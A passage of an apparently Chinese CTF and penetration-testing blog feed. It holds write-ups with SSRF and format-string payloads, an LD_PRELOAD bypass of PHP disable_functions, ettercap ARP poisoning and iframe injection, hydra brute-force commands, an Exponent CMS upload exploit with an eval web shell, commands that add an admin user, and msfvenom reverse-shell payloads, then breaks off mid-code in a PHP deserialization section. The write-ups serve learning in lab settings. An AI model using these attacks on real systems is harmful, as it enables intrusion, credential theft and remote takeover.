class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;head&#39;])&amp;&amp;isset($_GET[&#39;url&#39;])){    $begin = &quot;The number you want: &quot;;    extract($_GET);    if($head == &#39;&#39;){        die(&#39;Where is your head?&#39;);    }    if(preg_match(&#39;/[A-Za-z0-9]/i&#39;,$head)){        die(&#39;Head can\&#39;t be like this!&#39;);    }    if(preg_match(&#39;/log/i&#39;,$url)){        die(&#39;No No No&#39;);    }    if(preg_match(&#39;/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i&#39;,$url)){        die(&#39;Don\&#39;t use strange protocol!&#39;);    }    $funcname = $head.&#39;curl_init&#39;;    $ch = $funcname();    if($ch){        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        curl_close($ch);    }    else{        $output = &#39;rua&#39;;    }    echo sprintf($begin.&#39;%d&#39;,$output);}else{    show_source(__FILE__);}</code></pre><p>几个小trick</p><ul><li><code>$head = \</code> 这样拼接之后就是根命名空间</li><li>协议基本都被过滤干净了就只能用http协议</li><li><code>$begin= %s%</code></li><li>过滤了 <code>log</code>，我估计是出题人不想让你去读日志(因为后面发现可以读除了flag之外的任意文件)</li></ul><p>之后就扫内网，看到开放了8080端口</p><p><img src="/posts/2f3193b1/1583812423811.png" alt></p><p>这里的坑点就比较多了，首先需要知道vipcode</p><pre><code>?head=\&amp;url=http://127.0.0.1:8080/read/file={file.vip.__dict__}%26vipcode=0&amp;begin=%s%</code></pre><p><img src="/posts/2f3193b1/1583812448622.png" alt></p><p>然后读文件</p><pre><code>/?head=\&amp;url=http://127.0.0.1:8080/read/file=/app/base/vip.py%26vipcode=m3O5PGEBMnbX0N8ugWlIoijtFaS9KsqVAQdvZyT1cheCxpwf&amp;begin=%s%</code></pre><p><img src="/posts/2f3193b1/1583812465323.png" alt></p><p><code>vip.py</code> </p><pre><code class="python">Welcome,dear vip! Here are what you want:The file you read is:/app/base/vip.pyThe content is:import randomimport stringvipcode = &#39;&#39;class vip:    def __init__(self):        global vipcode        if vipcode == &#39;&#39;:            vipcode = &#39;&#39;.join(random.sample(string.ascii_letters+string.digits, 48))            self.truevipcode = vipcode        else:            self.truevipcode = vipcode    def GetCode(self):        return self.truevipcodeOther files under the same folder:__pycache__ __init__.py vip.py readfile.py%d</code></pre><p><code>readfile.py</code></p><pre><code class="python">from .vip import vipimport reimport osclass File:    def __init__(self,file):        self.file = file    def __str__(self):        return self.file    def GetName(self):        return self.fileclass readfile():    def __str__(self):        filename = self.GetFileName()        if &#39;..&#39; in filename or &#39;proc&#39; in filename:            return &quot;quanbumuda&quot;        else:            try:                file = open(&quot;/tmp/&quot; + filename, &#39;r&#39;)                content = file.read()                file.close()                return content            except:                return &quot;error&quot;    def __init__(self, data):        if re.match(r&#39;file=.*?&amp;vipcode=.*?&#39;,data) != None:            data = data.split(&#39;&amp;&#39;)            data = {                data[0].split(&#39;=&#39;)[0]: data[0].split(&#39;=&#39;)[1],                data[1].split(&#39;=&#39;)[0]: data[1].split(&#39;=&#39;)[1]            }            if &#39;file&#39; in data.keys():                self.file = File(data[&#39;file&#39;])            if &#39;vipcode&#39; in data.keys():                self.vipcode = data[&#39;vipcode&#39;]            self.vip = vip()    def test(self):        if &#39;file&#39; not in dir(self) or &#39;vipcode&#39; not in dir(self) or &#39;vip&#39; not in dir(self):            return False        else:            return True    def isvip(self):        if self.vipcode == self.vip.GetCode():            return True        else:            return False    def GetFileName(self):        return self.file.GetName()current_folder_file = []class vipreadfile():    def __init__(self,readfile):        self.filename = readfile.GetFileName()        self.path = os.path.dirname(os.path.abspath(self.filename))        self.file = File(os.path.basename(os.path.abspath(self.filename)))        global current_folder_file        try:            current_folder_file = os.listdir(self.path)        except:            current_folder_file = current_folder_file    def __str__(self):        if &#39;fl4g&#39; in self.path:            return &#39;nonono,this folder is a secret!!!&#39;        else:            output = &#39;&#39;&#39;Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n&#39;&#39;&#39;            filepath = (self.path + &#39;/{vipfile}&#39;).format(vipfile=self.file)            output += filepath            output += &#39;\r\n\r\nThe content is:\r\n&#39;            try:                f = open(filepath,&#39;r&#39;)                content = f.read()                f.close()            except:                content = &#39;can\&#39;t read&#39;            output += content            output += &#39;\r\n\r\nOther files under the same folder:\r\n&#39;            output += &#39; &#39;.join(current_folder_file)            return output</code></pre><p>过滤掉了 <code>fl4g</code></p><p><img src="/posts/2f3193b1/0-1583812648124.png" alt></p><p>看到 <code>current_folder_file</code> 是 global 的</p><p>所以读一次根目录的文件，让<code>current_folder_file</code> 里面有 <code>fl4g</code></p><p><img src="/posts/2f3193b1/0-1583812681289.png" alt></p><pre><code>/?head=\&amp;url=http://localhost:8080/read/file=/{vipfile.__class__.GetName.__globals__[current_folder_file][21]}/flag%26vipcode=m3O5PGEBMnbX0N8ugWlIoijtFaS9KsqVAQdvZyT1cheCxpwf&amp;begin=%s%</code></pre><p>或者这个</p><pre><code>http://121.37.179.47:1101/?head=\&amp;begin=%1$s&amp;url=http://127.0.0.1:8080/read/file={vipfile.__class__.__init__.__globals__[__name__][9]}l4g_1s_h3re_u_wi11_rua/flag%26vipcode=kWSRgrZO9VjAJzaHsIwqXEtfF5u6GxM0ov74le18hcNnUpd3</code></pre><h2 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h2><p>false注入</p><p><code>username=&#39;%&#39;1&amp;password=&#39;%&#39;1</code></p><p>即可</p><h2 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h2><h2 id="happyvacation"><a href="#happyvacation" class="headerlink" title="happyvacation"></a>happyvacation</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行进阶</title>
      <link href="/posts/137d2c1/"/>
      <url>/posts/137d2c1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>绕过disable_function总结</title>
      <link href="/posts/1cc6bf70/"/>
      <url>/posts/1cc6bf70/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>有一部分CTF题目，当你拿到webshell，蚁剑连接上去之后，却不能执行系统命令，这就是要绕过 <code>disable_function</code> 了</p><p><img src="/posts/1cc6bf70/1583650697704.png" alt="、"></p><p>可以看到禁用了很多函数</p><pre><code>apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system</code></pre><h2 id="LD-PRELOAD-劫持系统函数"><a href="#LD-PRELOAD-劫持系统函数" class="headerlink" title="LD_PRELOAD 劫持系统函数"></a>LD_PRELOAD 劫持系统函数</h2><blockquote><p>LD_PRELOAD 是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。</p></blockquote><p>所以我们就可以通过利用环境变量LD_PRELOAD劫持系统函数，让外部程序加载恶意的.so文件，达到执行系统命令的效果</p><p>例如：</p><pre><code>$ LD_PRELOAD=/path/to/my/malloc.so /bin/ls</code></pre><p>即在执行<code>ls</code>命令前，会先加载指定路径的<code>malloc.so</code>文件，如果这是一个恶意共享对象，那么可以执行任意操作。</p><p>我们可以通过<code>readelf</code>命令查看某个命令调用了哪些外部链接库，然后找到其中某个库，编写同名函数进行劫持，然后编译成共享对象文件，接着使用<code>LD_PRELOAD</code>环境变量指定生成的对象，达到命令执行的目的。</p><h3 id="一个简单的劫持示例"><a href="#一个简单的劫持示例" class="headerlink" title="一个简单的劫持示例"></a>一个简单的劫持示例</h3><p><code>getpid.c</code> 的内容如下</p><pre><code class="C">#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;void payload(void){    system(&quot;echo &#39;pwned by getpid!&#39;&quot;);}pid_t getpid(void){    if (getenv(&quot;LD_PRELOAD&quot;) == NULL){        return 0;    }    unsetenv(&quot;LD_PRELOAD&quot;);    payload();    return 0;}</code></pre><p>我们在这里劫持了 <code>getpid</code> 函数，由于python运行的时候使用了 <code>getpid</code> 函数，所以可以通过 <code>LD_PRELODAD</code> 来执行任意命令</p><pre><code>gcc -shared -fPIC getpid.c -o getpid.soLD_PRELOAD=./getpid.so python</code></pre><p>执行效果</p><p><img src="/posts/1cc6bf70/1583651075354.png" alt></p><p>注意：因为通过设置<code>preload</code>劫持了比较底层的函数，而派发出的新进程如果用到该函数也会一并被劫持，也就是说如果没有及时<code>unsetenv(&quot;LD_PRELOAD&quot;)</code>则会导致不断循环，一旦操作敏感就会比较危险，所以一定要及时删除这个环境变量，</p><p>所以绕过php disable_function也就比较简单了</p><blockquote><p>php中的mail、error_log函数是通过调用系统中的sendmail命令实现的(其他类似php中的函数还有imap_mail、mb_send_mail<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">参考</a>)，sendmail二进制文件中使用了getuid库函数，这样我们可以覆盖getuid函数。</p></blockquote><p>写一个 <code>getuid</code> </p><pre><code class="C">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int  getuid() {const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }unsetenv(&quot;LD_PRELOAD&quot;);system(cmdline);}</code></pre><p><code>gcc -shared -fPIC geteuid.c -o getuid.so</code> 编译成动态链接库。</p><p>然后再写一个php文件，设置好 <code>EVIL_CMDLINE</code> 环境变量，同时需要执行 so 文件地址</p><pre><code class="php">&lt;?php    $cmd = $_REQUEST[&quot;cmd&quot;];    $out_path = $_REQUEST[&quot;outpath&quot;];    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);    $so_path = $_REQUEST[&quot;sopath&quot;];    putenv(&quot;LD_PRELOAD=&quot; . $so_path);    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;;  ?&gt;</code></pre><h2 id="无需劫持函数绕过-disable-function"><a href="#无需劫持函数绕过-disable-function" class="headerlink" title="无需劫持函数绕过 disable_function"></a>无需劫持函数绕过 disable_function</h2><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?files=1&tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">下载地址</a></p><blockquote><p>GCC 有个 C 语言扩展修饰符<strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行<strong>attribute</strong>((constructor)) 修饰的函数。</p></blockquote><p>于是修改一下原来的共享链接库代码</p><pre><code class="C">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void getuid() {const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }unsetenv(&quot;LD_PRELOAD&quot;);system(cmdline);}</code></pre><blockquote><p>这意味着，我们只需要找到该php环境中存在执行系统命令的函数、且putenv函数未被禁用的情况下，就可以绕过disable_function。</p></blockquote><p>演示一下</p><pre><code class="C">#include &lt;unistd.h&gt;void payload(void){    system(&quot;echo &#39;pwned!&#39;&quot;);}__attribute__ ((__constructor__)) void exec(void){    if (getenv(&quot;LD_PRELOAD&quot;) == NULL){        return;    }    unsetenv(&quot;LD_PRELOAD&quot;);    payload();    return;}</code></pre><p><img src="/posts/1cc6bf70/1583651506472.png" alt></p><h2 id="php7绕过disable-funtion"><a href="#php7绕过disable-funtion" class="headerlink" title="php7绕过disable_funtion"></a>php7绕过disable_funtion</h2><p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">脚本地址</a></p><h2 id="ctfhub题目"><a href="#ctfhub题目" class="headerlink" title="ctfhub题目"></a>ctfhub题目</h2><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>使用蚁剑连接之后，直接加载插件，之后生成一个 <code>.antproxy.php</code> ，选择这个文件连接即可(密码不变)</p><p><img src="/posts/1cc6bf70/1583651719652.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kylingit.com/blog/利用ld_preload绕过disbale_functions/" target="_blank" rel="noopener">https://kylingit.com/blog/%E5%88%A9%E7%94%A8ld_preload%E7%BB%95%E8%BF%87disbale_functions/</a></p><p><a href="https://j7ur8.github.io/WebBook/PHP/LD_PRELOAD劫持系统函数.html" target="_blank" rel="noopener">https://j7ur8.github.io/WebBook/PHP/LD_PRELOAD%E5%8A%AB%E6%8C%81%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0.html</a></p><p><a href="https://blog.szfszf.top/article/37/" target="_blank" rel="noopener">https://blog.szfszf.top/article/37/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络侦察实验</title>
      <link href="/posts/ea51772/"/>
      <url>/posts/ea51772/</url>
      
        <content type="html"><![CDATA[<p>实验的网络拓扑结构：kali是攻击机，另外两台是靶机</p><p><img src="/posts/ea51772/1583827591679.png" alt></p><p><img src="/posts/ea51772/1583827763195.png" alt></p><h2 id="任务一-使用nmap-ettercap进行网络侦查和密码嗅探"><a href="#任务一-使用nmap-ettercap进行网络侦查和密码嗅探" class="headerlink" title="任务一  使用nmap,ettercap进行网络侦查和密码嗅探"></a>任务一  使用nmap,ettercap进行网络侦查和密码嗅探</h2><p>ettercap使用</p><p>常用参数</p><ul><li>-l 显示可用网卡</li><li>-i 选择网卡</li><li>-t 协议选择，tcp/udp/all</li><li>-p 不进行毒化攻击，只用来嗅探</li><li>-F 载入过滤器文件</li><li>-V text 将数据包以文本形式显示在屏幕上</li></ul><p><code>ettercap -Tzq</code> 以命令行显示，只嗅探本地数据包，只显示捕捉到的用户名和密码以及其他信息</p><p>具体到这个实验，需要使用ettercap去捕获ftp登陆的用户名和口令。其中，192.168.1.3 开放了ftp端口，所以尝试多次之后</p><pre><code>ettercap -i eth1 -Tq -L sniffeddata -M arp:remote //192.168.1.3/21//</code></pre><p><img src="/posts/ea51772/Image.png" alt></p><p>然后就抓到密码了</p><p><img src="/posts/ea51772/Image-1583392370959.png" alt></p><p>ettercap过滤脚本学习：</p><pre><code> if (ip.proto == TCP &amp;&amp; ip.dst != &#39;192.1.1.200&#39; &amp;&amp; tcp.dst == 80 || tcp.dst == 8080) {      #...and if it contains an Accept-Encoding header...      if (search(DATA.data, &quot;Accept-Encoding&quot;)) {      #...remove any Encoding (make sure we are using plain text)      replace(&quot;Accept-Encoding&quot;, &quot;Accept-Nothing!&quot;);        }    }    #--Inject Iframe--    if (ip.proto == TCP &amp;&amp; ip.dst != &#39;192.1.1.200&#39; &amp;&amp; tcp.src == 80 || tcp.src == 8080) {       if (search(DATA.data, &quot;&lt;body&gt;&quot;)){           #Replace it with the body tag and an iframe to our attacking webpage           replace(&quot;&lt;body&gt;&quot;,&quot;&lt;body&gt;&lt;iframe src=&#39;http://192.1.1.200&#39; width=0 height=0 /&gt;&quot;);           msg(&quot;iframe injected after &lt;body&gt;\n&quot;);       }       if (search(DATA.data, &quot;&lt;BODY&gt;&quot;)){           replace(&quot;&lt;BODY&gt;&quot;,&quot;&lt;BODY&gt;&lt;IFRAME SRC=&#39;http://192.1.1.200&#39; width=0 height=0 /&gt;&quot;);           msg(&quot;iframe injected after &lt;BODY&gt;\n&quot;);       }   }</code></pre><p>第一部分的作用是将HTTP请求头中的Accept-Encoding部分替换掉，使WebServer返回的数据是原始数据，而不是经过压缩（如gzip）后的数据，方便我们嗅探分析。第二部分的作用是查找返回数据中的<body>和<BODY>标签，并在它后面添加一个iframe标签。</BODY></body></p><p>基本语法</p><pre><code>Ettercap的过滤规则只有经过编译之后才能由-F参数载入到ettercap中使用。编译过滤规则的命令是：etterfilter filter.ecf -o filter.ef。即把filter.ecf文件编译成ettercap能识别的filter.ef文件。过滤规则的语法与C类似，但只有if语句，不支持循环语句。需要注意的地方是，if与”(”之间必须要有一个空格，且大括号{}不能省略。Ettercap提供的一些常用的函数有：search(where, what) 从字符串where中查找what，若找到则返回trueregex(where, regex) 从字符串where中匹配正则表达式regex，若找到则返回truereplace(what, with) 把字符串what替换成字符串withlog(what, where) 把字符串what记录到where文件中msg(message) 在屏幕上显示出字符串messageexit() 退出</code></pre><p>（当然这里不用这么复杂啦</p><h2 id="任务二-使用crunch，hydra暴力破解ssh服务"><a href="#任务二-使用crunch，hydra暴力破解ssh服务" class="headerlink" title="任务二 使用crunch，hydra暴力破解ssh服务"></a>任务二 使用crunch，hydra暴力破解ssh服务</h2><p>crunch的基本用法</p><p>*　　-b #体积大小，比如后跟20mib<br>*　　-c #密码个数（行数），比如8000<br>*　　-d #限制出现相同元素的个数（即至少出现元素个数），-d 3就不会出现zzf ffffgggg之类的<br>*　　-e #定义停止生成密码 ，比如-e 222222：到222222停止生成密码<br>*　　-f #调用密码库文件，比如/usr/share/crunch/charset.lst<br>*　　-i #改变输出格式<br>*　　-l #与-t搭配使用<br>*　　-m #与-p搭配使用<br>*　　-o #保存为<br>*　　-p #定义密码元素<br>*　　-q #读取字典<br>*　　-r #定义从某一个地方重新开始<br>*　　-s #第一个密码，从xxx开始<br>*　　-t #定义输出格式</p><p>hydra爆破的用法</p><ul><li>破解ssh</li></ul><p><code>hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh</code></p><ul><li>破解ftp</li></ul><p><code>hydra ip ftp -l 用户名 -P 密码字典 -t线程(默认16) -vV</code></p><ul><li>破解rdp</li></ul><p><code>hydra ip rdp -l administrator -P pass.txt -V</code></p><ul><li>破解telnet</li></ul><p><code>hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</code></p><p>当然这里我们直接社工吧。。hacker123</p><h2 id="任务三-使用ssh登陆"><a href="#任务三-使用ssh登陆" class="headerlink" title="任务三 使用ssh登陆"></a>任务三 使用ssh登陆</h2><p>不说了。。ssh命令了解一下即可</p><h2 id="任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息"><a href="#任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息" class="headerlink" title="任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息"></a>任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息</h2><p>这是exponent cms的漏洞，百度就知道了</p><p><a href="https://www.anquanke.com/post/id/84514" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84514</a></p><p>简单来说就是对上传没做过滤可以任意文件上传，但是上传之后就会被删掉</p><p>(看上去挺安全的，其实23333，引狼入室犯了安全大忌)</p><p>在判断的时候，可以通过修改参数来实现绕过删除</p><p>绕过删除之后，由于文件被重命名了，所以需要爆破一下文件名，使用脚本能够比较方便的完成</p><pre><code class="python">import requestsbase_url=&#39;http://192.168.1.4/&#39;url_for_time=&#39;index.php?module=eventregistration&amp;action=eventsCalendar&#39;url_for_upload=&#39;index.php?module=eventregistration&amp;action=emailRegistrants&amp;email_addresses=123456789@123.com&amp;email_message=1&amp;email_subject=1&#39;files={&#39;attach&#39;:open(&#39;index.php&#39;,&#39;rb&#39;)}requests.post(base_url+url_for_upload,files=files)print &#39;upload finish&#39;r=requests.get(base_url+url_for_time)html1=r.content#print html1index=r.content.find(&#39;History.pushState&#39;)if index:    time=html1[index:index+60].split(&#39;rel&#39;)[1].split(&#39;\&#39;&#39;)[1]else:    print &#39;something wrong&#39;    exit(0)print &quot;get time:&quot;+ timefor i in range(int(time),int(time)-20,-1):    shell_url=base_url+&#39;tmp/&#39;+str(i)+&#39;_index.php&#39;    r2=requests.get(shell_url)    if r2.status_code==200:        print &quot;shell is here : &quot;+shell_url </code></pre><p>准备一个index.php</p><pre><code class="php">root@simpleedu:~# cat index.php&lt;?phpeval($_REQUEST[cmd]);phpinfo();?&gt;</code></pre><p>(为了验证上传成功，多加个phpinfo())</p><p>自动上传，爆破得到文件名</p><p><img src="/posts/ea51772/1583828526162.png" alt></p><p>然后就是添加用户，将用户添加到用户组</p><pre><code>net user hacker Beijing123 /addnet localgroup administrators hacker /add</code></pre><p>看一下端口开放情况</p><p><img src="/posts/ea51772/1583828518473.png" alt></p><p>这里。。比较坑的就是远程桌面并不是3389，而是。。。35155</p><pre><code>rdesktop 192.168.1.4:35155</code></pre><p>连接之后即可，发现 <code>2.key</code> 文件，给它添加一个用户即可</p><p><img src="/posts/ea51772/1583828819591.png" alt></p><p>太卡了就不演示了</p><h2 id="ps-使用metasploit做法"><a href="#ps-使用metasploit做法" class="headerlink" title="ps 使用metasploit做法"></a>ps 使用metasploit做法</h2><p>一开始由于找不到图形界面，所以只能用命令行去刚。最后还是屈服了(GUI真香)</p><p>msfvenom生成php马</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f raw  -o index.php</code></pre><p><img src="/posts/ea51772/1583829091269.png" alt="成功弹到shell"></p><p>然而美中不足的是权限不够，所以需要再生成一个Windows的木马反弹一次。。</p><p>重新开始监听，换一个payload</p><p><img src="/posts/ea51772/1583829313717.png" alt></p><p>msfvenom 生成shell.exe</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f exe -o shell.exe</code></pre><p>传一下shell.exe</p><p><img src="/posts/ea51772/1583829335497.png" alt="1583829335497"></p><p>执行，成功反弹</p><p><img src="/posts/ea51772/1583829371796.png" alt></p><p>当然这样也能获得管理员权限，但是还是没法读文件</p><p><img src="/posts/ea51772/1583829406417.png" alt></p><p>也就是记录一下msf的强大</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化导致字符的逃逸</title>
      <link href="/posts/bdd52bdc/"/>
      <url>/posts/bdd52bdc/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>PHP 在反序列化时，<strong>对类中不存在的属性也会进行反序列化</strong></p><p>这个点很神奇，</p><h2 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h2><pre><code class="php">&lt;?phpfunction filter($string){    return preg_match(&#39;/x/&#39;,&#39;yy&#39;,$string);}$username = &quot;peri0d&quot;;$password = &quot;aaaaa&quot;;$user = array($username, $password);var_dump(serialize($user));echo &#39;\n&#39;;$r = filter(serialize($user));var_dump($r);echo &#39;\n&#39;;var_dump(unserialize($r));</code></pre><p>这里将 <code>x</code> 替换为 <code>yy</code>,也就是变长了，正常的序列化数据为</p><pre><code>a:2:{i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre><p>如果我们可以控制用户名去修改密码，那么应该是这样的</p><pre><code>a:2:{i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre><p>(尤其注意这里的双引号)</p><p><code>peri0d</code> 长度为6，<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code> 长度为20</p><p>x替换为yy，长度由原来的1变为2，那么我们这里设填充为z,满足</p><p>6+20+z = 6+2z，得到的z就是20，所以填充x为20即可</p><pre><code class="php">$username = &quot;peri0d&quot;;$payload = &#39;&quot;;i:1;s:6:&quot;123456&quot;;}&#39;;$x = str_repeat(&quot;x&quot;,20);$username = $username.$x.$payload;$password = &quot;aaaaa&quot;;$user = array($username, $password);$r = filter(serialize($user));var_dump($r);echo &#39;\n&#39;;var_dump(unserialize($r));</code></pre><p>结果</p><pre><code>&quot;a:2:{i:0;s:46:&quot;peri0dyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}&quot;array(2) {  [0] =&gt;  string(46) &quot;peri0dyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;  [1] =&gt;  string(6) &quot;123456&quot;}</code></pre><h2 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a>例题二</h2><p>安洵杯 easy_serialize_php</p><p>代码如下</p><pre><code class="php"> &lt;?php$function = @$_GET[&#39;f&#39;];function filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}if($_SESSION){    unset($_SESSION);}$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function){    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;}if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;){    highlight_file(&#39;index.php&#39;);}else if($function == &#39;phpinfo&#39;){    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!}else if($function == &#39;show_image&#39;){    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));} </code></pre><p>flag 在 <code>d0g3_f1ag.php</code> 这个文件中</p><p><code>$_SESSION</code> 数组中有 <code>user, funciton, img</code> 这三个属性</p><p>最后读文件的文件名是 <code>$_SESSION[&#39;img&#39;]</code> ，如果能够控制这个属性就好了，但是</p><pre><code class="php">if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}</code></pre><p>显然 <code>sha1</code> 的数据你是没法控制的，那怎么搞呢</p><p>重点在这里</p><pre><code class="php">$serialize_info = filter(serialize($_SESSION));</code></pre><p>序列化之后经过了一次过滤</p><p>而 <code>extract($_POST);</code> 使得我们可以控制 <code>$_SESSION</code> 数组中的 <code>user</code> 和 <code>function</code></p><p>先测试一下正常的一段序列化字符：</p><pre><code>a:3:{s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:4:&quot;2333&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>能不能控制好user和function，使得加上一个我们控制好的img</p><pre><code>a:3:{s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:4:&quot;2333&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;};s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>这样反序列化的时候最后的那个 img属性就是多余的了，我们来计算一下怎么利用过滤来达到目的</p><pre><code class="php">&lt;?phpfunction filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}$_SESSION[&#39;user&#39;] = &#39;2333&#39;;$_SESSION[&#39;function&#39;] = &#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&#39;;$_SESSION[&#39;img&#39;] = &#39;Z3Vlc3RfaW1nLnBuZwo=&#39;;$a = filter(serialize($_SESSION));var_dump(filter(serialize($_SESSION)));// var_dump(unserialize($a));</code></pre><p>此时生成的是</p><pre><code>a:3:{s:4:&quot;user&quot;;s:4:&quot;2333&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>我们要让 <code>&quot;;s:8:&quot;function&quot;;s:61:&quot;a</code> 这段字符被吃掉，成为 <code>user</code> 的值，算一下长度24，正好是6个flag</p><p>所以</p><pre><code class="php">&lt;?phpfunction filter($img){    